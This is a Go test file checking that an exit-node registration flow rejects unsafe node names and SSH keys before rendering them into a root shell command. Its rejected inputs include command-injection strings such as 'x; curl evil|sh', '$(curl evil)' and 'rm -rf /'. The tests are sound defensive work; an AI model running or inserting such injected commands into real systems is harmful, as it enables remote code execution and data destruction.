// File: internal/feature/admin/exit_node_register_b266_test.go
//
// B266 (2026-09-19) — pure-function tests for the
// "Зарегистрировать новый exit node" flow:
//
//   - isSafeNodeName: the node name is BOTH rendered into a copy-paste
//     shell command AND becomes the tailnet hostname, so a value like
//     `x; curl evil|sh` must never reach the command block.
//   - exitNodeRegisterCommand: pins the command shape (login-server,
//     key, --advertise-exit-node, forwarding setup) so the operator's
//     clipboard actually works, and pins that an EMPTY hostname does not
//     render a broken `--hostname=` flag.

package admin

import (
	"strings"
	"testing"
)

func TestIsSafeNodeName_AcceptsRealHostnames(t *testing.T) {
	for _, in := range []string{
		"emilia", "sharlotta", "karolina", "skygate-host", "relay-4",
		"relay_4", "vps.frankfurt.example.com", "A71", "nothing-phone-2",
		"9", "a",
	} {
		if !isSafeNodeName(in) {
			t.Errorf("isSafeNodeName(%q) = false; want true", in)
		}
	}
}

func TestIsSafeNodeName_RejectsShellAndJunk(t *testing.T) {
	for _, in := range []string{
		"",                      // empty
		"-leading-dash",         // would be parsed as a flag
		".leading-dot",          //
		"x; curl evil|sh",       // THE case: injected into the command block
		"x$(id)",                //
		"x`id`",                 //
		"x&&id",                 //
		"x|id",                  //
		"x y",                   // whitespace
		"x\ty",                  //
		"x/y",                   // slash is not a hostname char
		"x:y",                   //
		"кириллица",             // non-ASCII
		strings.Repeat("a", 64), // too long
	} {
		if isSafeNodeName(in) {
			t.Errorf("isSafeNodeName(%q) = true; want false", in)
		}
	}
}

func TestIsSafeNodeName_LengthBoundary(t *testing.T) {
	if !isSafeNodeName(strings.Repeat("a", 63)) {
		t.Errorf("63-char name rejected; want accepted (DNS limit)")
	}
}

func TestExitNodeRegisterCommand_Shape(t *testing.T) {
	cmd := exitNodeRegisterCommand("https://head.example.com", "tskey-auth-abc123", "relay-4", "")
	for _, want := range []string{
		"--login-server=https://head.example.com",
		"--authkey=tskey-auth-abc123",
		"--hostname=relay-4",
		"--advertise-exit-node",
		"--accept-routes",
		"ip_forward",
		"hostnamectl set-hostname relay-4",
	} {
		if !strings.Contains(cmd, want) {
			t.Errorf("command does not contain %q:\n%s", want, cmd)
		}
	}
	// The command must NOT contain a bare `--hostname=` with no value
	// (a broken copy-paste) and must not reference an empty login server.
	if strings.Contains(cmd, "--hostname= \\") || strings.Contains(cmd, "--hostname=\n") {
		t.Errorf("command renders an empty --hostname:\n%s", cmd)
	}
	if strings.Contains(cmd, "--login-server= \\") {
		t.Errorf("command renders an empty --login-server:\n%s", cmd)
	}
	// Without a management key the command keeps the pre-B310 shape: no
	// authorized_keys step and no sixth step.
	if strings.Contains(cmd, "authorized_keys") {
		t.Errorf("an empty management key must NOT render an authorized_keys step:\n%s", cmd)
	}
	if !strings.Contains(cmd, "# 5. вернуться сюда") {
		t.Errorf("without a management key the last step stays #5:\n%s", cmd)
	}
}

// TestExitNodeRegisterCommand_B310CarriesTheManagementKey pins the onboarding half
// of B310: a new relay is given skygate's own public key in the same paste, so
// management can go over the tailnet from the first sync.
func TestExitNodeRegisterCommand_B310CarriesTheManagementKey(t *testing.T) {
	const key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7 test@skygate"
	cmd := exitNodeRegisterCommand("https://head.example.com", "tskey-auth-abc123", "relay-4", key)
	if !strings.Contains(cmd, "authorized_keys") {
		t.Fatalf("the management key must render an authorized_keys step:\n%s", cmd)
	}
	if !strings.Contains(cmd, key) {
		t.Errorf("the key itself must be embedded verbatim:\n%s", cmd)
	}
	// Idempotent: a re-run must not append the key twice.
	if !strings.Contains(cmd, "grep -qF '"+key+"'") {
		t.Errorf("the step must be idempotent (grep -qF before appending):\n%s", cmd)
	}
	// Step numbering keeps the "come back and press Re-sync" step last.
	if !strings.Contains(cmd, "# 5. разрешить skygate управлять этим узлом по SSH") {
		t.Errorf("the key step should be step 5:\n%s", cmd)
	}
	if !strings.Contains(cmd, "# 6. вернуться сюда") {
		t.Errorf("the Re-sync step must be renumbered to 6:\n%s", cmd)
	}
}

// TestExitNodeAuthorizedKeyStep_RefusesUnsafeKeys: the value is rendered into a
// root shell, so the same gate the node name gets applies here.
func TestExitNodeAuthorizedKeyStep_RefusesUnsafeKeys(t *testing.T) {
	for _, bad := range []string{
		"",
		"   ",
		"ssh-ed25519 AAAA'; rm -rf / #",
		"ssh-ed25519 AAAA\necho pwned",
		"ssh-ed25519 $(curl evil)",
		"not-a-key at all",
	} {
		if got := exitNodeAuthorizedKeyStep(bad); got != "" {
			t.Errorf("exitNodeAuthorizedKeyStep(%q) = %q; want empty", bad, got)
		}
	}
	if got := exitNodeAuthorizedKeyStep("ssh-ed25519 AAAA test@host"); got == "" {
		t.Errorf("a normal key must be accepted")
	}
}

func TestExitNodeRegisterCommand_EmptyHostnamePlaceholder(t *testing.T) {
	cmd := exitNodeRegisterCommand("", "key", "", "")
	// No hostname → no hostnamectl step, and the tailscale line carries a
	// visible placeholder instead of an empty value.
	if strings.Contains(cmd, "hostnamectl set-hostname") {
		t.Errorf("empty hostname should skip the hostnamectl step:\n%s", cmd)
	}
	if !strings.Contains(cmd, "<уникальное-имя>") {
		t.Errorf("empty hostname should render a placeholder:\n%s", cmd)
	}
	// Default login server when none is configured.
	if !strings.Contains(cmd, "--login-server=https://head.example.com") {
		t.Errorf("empty login server should fall back to a visible placeholder:\n%s", cmd)
	}
}
